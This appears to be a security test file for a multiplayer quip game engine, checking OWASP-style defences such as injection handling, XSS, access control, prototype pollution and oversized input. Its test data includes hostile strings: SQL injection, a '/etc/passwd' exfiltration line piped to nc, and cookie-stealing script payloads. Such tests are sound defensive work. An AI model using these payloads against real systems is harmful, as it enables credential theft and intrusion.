import { describe, expect, test, beforeAll, afterAll } from 'bun:test';
import { createServer, type Server as HttpServer } from 'http';
import { io as Client, type Socket as ClientSocket } from 'socket.io-client';
import { GameEngine } from '../gameEngine';
import { setupSocketServer } from '../socketServer';
import type {
  Player,
  RoomState,
  ClientGameState,
  ClientToServerEvents,
  ServerToClientEvents,
} from '../../types/game';

type TypedClientSocket = ClientSocket<ServerToClientEvents, ClientToServerEvents>;

function waitForState(
  socket: TypedClientSocket,
  predicate: (state: ClientGameState) => boolean,
  timeoutMs = 8000
): Promise<ClientGameState> {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      socket.off('sync:state', handler);
      reject(new Error(`Timeout waiting for state matching predicate after ${timeoutMs}ms`));
    }, timeoutMs);

    const handler = (state: ClientGameState) => {
      if (predicate(state)) {
        clearTimeout(timer);
        socket.off('sync:state', handler);
        resolve(state);
      }
    };

    socket.on('sync:state', handler);
  });
}

describe('Security Hardening & OWASP Vulnerability Verification', () => {
  const createMockPlayer = (id: string, nickname: string, isHost = false): Player => ({
    id,
    nickname,
    avatarSeed: id,
    score: 0,
    isHost,
    isConnected: true,
    hasSubmitted: false,
  });

  // =========================================================================
  // 1. Injection Vulnerabilities (SQLi & Command Injection)
  // =========================================================================
  describe('A03:2021 - Injection Prevention (SQLi & OS Command Injection)', () => {
    test('SQL Injection payloads are treated as literal text and do not execute', () => {
      const p1 = createMockPlayer('p1', "' OR 1=1; --", true);
      const p2 = createMockPlayer('p2', "admin' UNION SELECT * FROM users; --");

      let room: RoomState = GameEngine.createRoom('TEST', p1);
      room.players['p2'] = p2;
      room = GameEngine.startWritingPhase(room);

      const promptId = room.prompts[0].id;
      const sqliPayload = "'; DROP TABLE rooms; SELECT * FROM pg_tables; --";

      const res = GameEngine.recordAnswer(room, 'p1', promptId, sqliPayload);
      expect(res.ok).toBe(true);

      const recorded = room.answers.find((a) => a.playerId === 'p1' && a.promptId === promptId);
      expect(recorded?.text).toBe(sqliPayload.slice(0, 45));
      expect(room.players['p1'].nickname).toBe("' OR 1=1; --");
    });

    test('Command injection characters are treated as literal strings', () => {
      const p1 = createMockPlayer('p1', '$(whoami)', true);
      const room: RoomState = GameEngine.createRoom('TEST', p1);
      const promptId = 'prompt-dummy';
      room.assignments['p1'] = [promptId];

      const cmdPayload = '; cat /etc/passwd | nc 10.0.0.1 1337 &';
      const res = GameEngine.recordAnswer(room, 'p1', promptId, cmdPayload);
      expect(res.ok).toBe(true);

      const answer = room.answers.find((a) => a.playerId === 'p1');
      expect(answer?.text).toBe(cmdPayload.slice(0, 45));
    });
  });

  // =========================================================================
  // 2. Cross-Site Scripting (XSS / HTML Injection)
  // =========================================================================
  describe('A03:2021 - Stored & Reflected XSS Sanitization', () => {
    test('Script tags and event handlers are stored purely as literal text', () => {
      const xssNickname = '<script>alert(1)</script>';
      const xssQuip = '<img src=x onerror="alert(document.cookie)">';

      const p1 = createMockPlayer('p1', xssNickname, true);
      let room: RoomState = GameEngine.createRoom('TEST', p1);
      room = GameEngine.startWritingPhase(room);

      const promptId = room.prompts[0].id;
      const res = GameEngine.recordAnswer(room, 'p1', promptId, xssQuip);
      expect(res.ok).toBe(true);

      const clientState = GameEngine.getClientState(room, 'p1');
      expect(clientState.players[0].nickname).toBe(xssNickname);

      // Verify that no raw HTML evaluation or unescaped execution is permitted
      expect(typeof clientState.players[0].nickname).toBe('string');
    });
  });

  // =========================================================================
  // 3. Broken Access Control & Authorization (OWASP A01:2021)
  // =========================================================================
  describe('A01:2021 - Broken Access Control & Anti-Cheating', () => {
    test('Player cannot submit answers for prompts not assigned to them', () => {
      const p1 = createMockPlayer('p1', 'Alice', true);
      const p2 = createMockPlayer('p2', 'Bob');
      let room: RoomState = GameEngine.createRoom('TEST', p1);
      room.players['p2'] = p2;
      room = GameEngine.startWritingPhase(room);

      const p2Prompts = room.assignments['p2'];
      // An unassigned fake prompt
      const fakePromptId = 'prompt-unassigned-hack';

      const res = GameEngine.recordAnswer(room, 'p1', fakePromptId, 'Exploitative Quip');
      expect(res.ok).toBe(false);
      expect(res.error).toContain('not assigned to you');
    });

    test('Author cannot vote in their own matchup', () => {
      const p1 = createMockPlayer('p1', 'Alice', true);
      const p2 = createMockPlayer('p2', 'Bob');
      const p3 = createMockPlayer('p3', 'Charlie');

      let room: RoomState = GameEngine.createRoom('TEST', p1);
      room.players['p2'] = p2;
      room.players['p3'] = p3;
      room = GameEngine.startWritingPhase(room);

      Object.entries(room.assignments).forEach(([pId, promptIds]) => {
        promptIds.forEach((pid) => GameEngine.recordAnswer(room, pId, pid, `Quip ${pId}`));
      });

      room.duels = GameEngine.buildDuels(room);
      room.activeDuelIndex = 0;
      room.phase = 'DUEL_VOTING';

      const activeDuel = room.duels[0];
      const authorA = activeDuel.optionA.authorId;
      const authorB = activeDuel.optionB.authorId;

      const resA = GameEngine.castVote(room, authorA, activeDuel.id, 'A');
      expect(resA.ok).toBe(false);
      expect(resA.error).toContain('Authors cannot vote');

      const resB = GameEngine.castVote(room, authorB, activeDuel.id, 'B');
      expect(resB.ok).toBe(false);
      expect(resB.error).toContain('Authors cannot vote');
    });

    test('Client state projection strictly scrubs competitor answers and author names', () => {
      const p1 = createMockPlayer('p1', 'Alice', true);
      const p2 = createMockPlayer('p2', 'Bob');
      const p3 = createMockPlayer('p3', 'Charlie');

      let room: RoomState = GameEngine.createRoom('TEST', p1);
      room.players['p2'] = p2;
      room.players['p3'] = p3;
      room = GameEngine.startWritingPhase(room);

      // In WRITING: p1 must NOT see other players' answers or unassigned prompts
      const p1Writing = GameEngine.getClientState(room, 'p1');
      expect(p1Writing.activePrompts?.length).toBe(2);
      // Room answers are never included in ClientGameState
      expect((p1Writing as any).answers).toBeUndefined();

      // In DUEL_VOTING: Author nicknames must be completely redacted
      Object.entries(room.assignments).forEach(([pId, promptIds]) => {
        promptIds.forEach((pid) => GameEngine.recordAnswer(room, pId, pid, `Quip ${pId}`));
      });
      room.duels = GameEngine.buildDuels(room);
      room.phase = 'DUEL_VOTING';

      const p1Voting = GameEngine.getClientState(room, 'p1');
      expect(p1Voting.currentDuel?.optionA.authorNickname).toBeUndefined();
      expect(p1Voting.currentDuel?.optionB.authorNickname).toBeUndefined();
      expect(p1Voting.currentDuel?.results).toBeUndefined();
    });
  });

  // =========================================================================
  // 4. Prototype Pollution & Malicious Identifiers
  // =========================================================================
  describe('Prototype Pollution & Memory Safety', () => {
    test('Blocks __proto__, constructor, and prototype injection attempts', () => {
      const p1 = createMockPlayer('p1', 'Alice', true);
      let room: RoomState = GameEngine.createRoom('TEST', p1);
      room = GameEngine.startWritingPhase(room);

      const promptId = room.prompts[0].id;

      // Attempt prototype pollution via playerId
      const res1 = GameEngine.recordAnswer(room, '__proto__', promptId, 'Polluted');
      expect(res1.ok).toBe(false);
      expect(res1.error).toContain('Illegal player identifier');
      expect((Object.prototype as any).polluted).toBeUndefined();

      // Attempt prototype pollution via voterId
      room.duels = [{
        id: 'duel-1',
        promptId,
        promptText: 'Test',
        round: 1,
        optionA: { optionKey: 'A', authorId: 'p1', text: 'A' },
        optionB: { optionKey: 'B', authorId: 'p2', text: 'B' },
        eligibleVoterIds: ['p3'],
        votes: {},
        isJinx: false,
        isForfeit: false,
        isComplete: false,
      }];
      room.activeDuelIndex = 0;

      const res2 = GameEngine.castVote(room, '__proto__', 'duel-1', 'A');
      expect(res2.ok).toBe(false);
      expect(res2.error).toContain('Illegal voter identifier');
      expect((Object.prototype as any)['duel-1']).toBeUndefined();
    });
  });

  // =========================================================================
  // 5. Denial of Service, Type Confusion & Malformed Payloads
  // =========================================================================
  describe('Malformed Payloads & DoS Prevention', () => {
    test('Rejects non-string payloads without throwing unhandled exceptions', () => {
      const p1 = createMockPlayer('p1', 'Alice', true);
      let room: RoomState = GameEngine.createRoom('TEST', p1);
      room = GameEngine.startWritingPhase(room);
      const promptId = room.prompts[0].id;

      // Type confusion attacks: numbers, objects, arrays, null, undefined
      const invalidPayloads = [12345, null, undefined, {}, [], true, () => {}];

      invalidPayloads.forEach((payload) => {
        const res = GameEngine.recordAnswer(room, 'p1', promptId, payload as any);
        expect(res.ok).toBe(false);
        expect(res.error).toBe('Invalid payload format');
      });
    });

    test('Clamps oversized strings to 45 characters to prevent buffer overflow/DoS', () => {
      const p1 = createMockPlayer('p1', 'Alice', true);
      let room: RoomState = GameEngine.createRoom('TEST', p1);
      room = GameEngine.startWritingPhase(room);
      const promptId = room.prompts[0].id;

      // 50,000 character string attack
      const hugeString = 'A'.repeat(50000);
      const res = GameEngine.recordAnswer(room, 'p1', promptId, hugeString);
      expect(res.ok).toBe(true);

      const recorded = room.answers.find((a) => a.playerId === 'p1');
      expect(recorded?.text.length).toBe(45);
    });

    test('Rejects empty or whitespace-only answers', () => {
      const p1 = createMockPlayer('p1', 'Alice', true);
      let room: RoomState = GameEngine.createRoom('TEST', p1);
      room = GameEngine.startWritingPhase(room);
      const promptId = room.prompts[0].id;

      const res1 = GameEngine.recordAnswer(room, 'p1', promptId, '');
      expect(res1.ok).toBe(false);

      const res2 = GameEngine.recordAnswer(room, 'p1', promptId, '     ');
      expect(res2.ok).toBe(false);
    });
  });
});
